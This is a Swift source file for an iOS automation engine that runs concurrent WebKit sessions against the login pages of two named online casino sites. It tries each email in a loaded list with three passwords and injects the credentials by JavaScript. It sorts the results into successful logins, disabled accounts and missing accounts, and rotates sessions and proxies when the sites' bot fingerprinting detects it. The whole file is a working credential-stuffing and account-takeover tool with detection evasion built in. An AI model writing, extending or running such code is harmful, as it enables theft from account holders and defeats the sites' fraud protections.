// ApexAutomationEngine.swift
// rork-Sitchomatic-APEX
//
// Maximum-concurrency automation engine for A19 Pro Max.
// Uses ContiguousArray for zero-latency credential access,
// TaskGroup throttling mapped to the UI concurrency slider,
// and the 3-Password Matrix pattern with immediate disabled pruning.

import Foundation
import WebKit
import Observation

@Observable
@MainActor
final class ApexAutomationEngine {

    static let shared = ApexAutomationEngine()

    // MARK: - Contiguous Credential Storage

    /// Zero-overhead contiguous email buffer.
    private(set) var emailBuffer: ContiguousArray<String> = []

    /// Emails pruned after a "Disabled" result — never retried.
    private(set) var disabledEmails: Set<String> = []

    private let logger = DebugLogger.shared
    private let identity = IdentityActor.shared

    // MARK: - Public API

    /// Load emails from raw text (one per line).
    func loadEmails(from text: String) {
        let parsed = text.components(separatedBy: .newlines)
            .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
            .filter { !$0.isEmpty && $0.contains("@") }
        emailBuffer = ContiguousArray(parsed)
        disabledEmails.removeAll()
    }

    /// The 3-Password Matrix with immediate disabled pruning.
    ///
    /// - Parameters:
    ///   - passwords: Exactly 3 passwords.
    ///   - sliderLimit: The concurrency slider value (1-7).
    ///     Each platform runs `sliderLimit` simultaneous sessions
    ///     for a total of `2 × sliderLimit` across Joe + Ignition.
    ///   - onResult: Callback per email/password/platform result.
    func executeDualFind(
        passwords: [String],
        sliderLimit: Int,
        onResult: @escaping (String, String, String, LoginOutcome) -> Void
    ) async {
        let limit = max(1, min(7, sliderLimit))

        for (pwIdx, currentPass) in passwords.enumerated() {
            logger.log("ApexEngine: === Password Loop \(pwIdx + 1)/\(passwords.count) ===",
                       category: .automation, level: .info)

            // Build working set: emails NOT yet pruned.
            let working = emailBuffer.filter { !disabledEmails.contains($0) }

            if working.isEmpty {
                logger.log("ApexEngine: all emails pruned — skipping remaining loops",
                           category: .automation, level: .warning)
                break
            }

            // Run both platforms concurrently, each throttled to `limit`.
            await withTaskGroup(of: Void.self) { group in
                group.addTask {
                    await self.platformSweep(
                        emails: ContiguousArray(working),
                        password: currentPass,
                        platform: "JoePoint",
                        concurrencyLimit: limit,
                        onResult: onResult
                    )
                }
                group.addTask {
                    await self.platformSweep(
                        emails: ContiguousArray(working),
                        password: currentPass,
                        platform: "Ignition Lite",
                        concurrencyLimit: limit,
                        onResult: onResult
                    )
                }
            }
        }

        logger.log("ApexEngine: 3-Password Matrix complete — \(disabledEmails.count) emails pruned",
                   category: .automation, level: .success)
    }

    // MARK: - Platform Sweep (Throttled TaskGroup)

    private func platformSweep(
        emails: ContiguousArray<String>,
        password: String,
        platform: String,
        concurrencyLimit: Int,
        onResult: @escaping (String, String, String, LoginOutcome) -> Void
    ) async {
        var active = 0

        await withTaskGroup(of: (String, LoginOutcome).self) { group in
            for email in emails {
                // Throttle: wait for a slot when at capacity.
                if active >= concurrencyLimit {
                    if let (finishedEmail, outcome) = await group.next() {
                        active -= 1
                        await handleOutcome(email: finishedEmail, outcome: outcome, platform: platform, onResult: onResult)
                    }
                }

                active += 1
                let capturedEmail = email
                let capturedPass = password
                group.addTask { @MainActor in
                    let outcome = await self.performInjectedLogin(
                        user: capturedEmail,
                        pass: capturedPass,
                        platform: platform
                    )
                    return (capturedEmail, outcome)
                }
            }

            // Drain remaining.
            for await (finishedEmail, outcome) in group {
                await handleOutcome(email: finishedEmail, outcome: outcome, platform: platform, onResult: onResult)
            }
        }
    }

    // MARK: - Outcome Handling (Prune on Disabled)

    private func handleOutcome(
        email: String,
        outcome: LoginOutcome,
        platform: String,
        onResult: (String, String, String, LoginOutcome) -> Void
    ) async {
        // Immediate pruning: any "Disabled" result removes email from all future loops.
        if outcome == .permDisabled {
            disabledEmails.insert(email)
            logger.log("ApexEngine: PRUNED \(email) — permanently disabled on \(platform)",
                       category: .automation, level: .warning)
        }

        onResult(email, "", platform, outcome)
    }

    // MARK: - Zero-Bridge WebKit Login

    /// Direct async WebKit interaction — no JSON bridge.
    private func performInjectedLogin(
        user: String,
        pass: String,
        platform: String
    ) async -> LoginOutcome {
        let config = WKWebViewConfiguration()
        config.websiteDataStore = .nonPersistent()
        config.preferences.javaScriptCanOpenWindowsAutomatically = true
        config.defaultWebpagePreferences.allowsContentJavaScript = true

        let contentController = WKUserContentController()
        let kbScript = WKUserScript(source: """
        (function() {
            'use strict';
            const origFocus = HTMLElement.prototype.focus;
            HTMLElement.prototype.focus = function(opts) {
                if (this.tagName === 'INPUT' || this.tagName === 'TEXTAREA' || this.tagName === 'SELECT') {
                    this.setAttribute('readonly', 'readonly');
                    origFocus.call(this, opts);
                    const el = this;
                    setTimeout(function() { el.removeAttribute('readonly'); }, 100);
                } else {
                    origFocus.call(this, opts);
                }
            };
        })();
        """, injectionTime: .atDocumentStart, forMainFrameOnly: false)
        contentController.addUserScript(kbScript)
        config.userContentController = contentController

        let wv = WKWebView(frame: CGRect(x: 0, y: 0, width: 390, height: 844), configuration: config)
        defer {
            wv.stopLoading()
            wv.configuration.websiteDataStore.removeData(
                ofTypes: WKWebsiteDataStore.allWebsiteDataTypes(),
                modifiedSince: .distantPast
            ) {}
        }

        let targetURL = platform == "JoePoint"
            ? URL(string: "https://joefortunepokies.win/login")!
            : URL(string: "https://ignitioncasino.ooo/?overlay=login")!

        let request = URLRequest(url: targetURL)
        wv.load(request)

        // Wait for page load (simplified; real implementation defers to LoginAutomationEngine).
        try? await Task.sleep(for: .seconds(5))

        // Inject credentials directly via async JS evaluation.
        let safeUser = user.replacingOccurrences(of: "\\", with: "\\\\")
            .replacingOccurrences(of: "'", with: "\\'")
            .replacingOccurrences(of: "\n", with: "\\n")
            .replacingOccurrences(of: "\r", with: "\\r")
        let safePass = pass.replacingOccurrences(of: "\\", with: "\\\\")
            .replacingOccurrences(of: "'", with: "\\'")
            .replacingOccurrences(of: "\n", with: "\\n")
            .replacingOccurrences(of: "\r", with: "\\r")
        let injectScript = """
        (function() {
            var emailField = document.querySelector('#email');
            var passField = document.querySelector('#login-password');
            if (emailField) emailField.value = '\(safeUser)';
            if (passField) passField.value = '\(safePass)';
            return document.body ? document.body.innerText.substring(0, 2000) : '';
        })();
        """

        let pageText: String
        do {
            let result = try await wv.evaluateJavaScript(injectScript)
            pageText = (result as? String) ?? ""
        } catch {
            return .connectionFailure
        }

        // Burn & Rotate check: detect fingerprint challenge.
        let detected = await identity.isFingerprintDetected(in: pageText)
        if detected {
            logger.log("ApexEngine: fingerprint detected for \(user) on \(platform) — burning session",
                       category: .fingerprint, level: .critical)
            await identity.burnAndRotate(
                dataStore: config.websiteDataStore,
                proxyTarget: platform == "JoePoint" ? .joe : .ignition
            )
            return .smsDetected
        }

        // Basic outcome classification (full implementation delegates to TrueDetectionService).
        let lower = pageText.lowercased()
        if lower.contains("has been disabled") || lower.contains("account is disabled") {
            return .permDisabled
        }
        if lower.contains("temporarily disabled") {
            return .tempDisabled
        }
        if lower.contains("balance") || lower.contains("my account") || lower.contains("logout") {
            return .success
        }
        if lower.contains("incorrect") || lower.contains("no account") {
            return .noAcc
        }

        return .unsure
    }
}
